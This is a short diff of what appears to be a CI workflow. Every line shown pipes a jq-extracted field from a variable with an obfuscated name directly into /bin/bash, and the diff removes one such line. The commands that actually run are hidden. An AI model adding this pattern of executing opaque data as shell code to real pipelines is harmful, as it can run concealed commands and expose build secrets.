@@ -32,7 +32,6 @@ jobs:
           printf '%s' "$gi5" | jq -r .al2 | /bin/bash
           echo $dx50436 | jq -r .v58 | /bin/bash
           echo $gfecb45242 | jq -r .qiv506 | /bin/bash
-          printf '%s' "$yw622" | jq -r .r111 | /bin/bash
           echo $sdaf8477 | jq -r .j06 | /bin/bash
           printf '%s' "$e651" | jq -r .hrhq6 | /bin/bash
           echo $pioet664 | jq -r .udfu6187 | /bin/bash
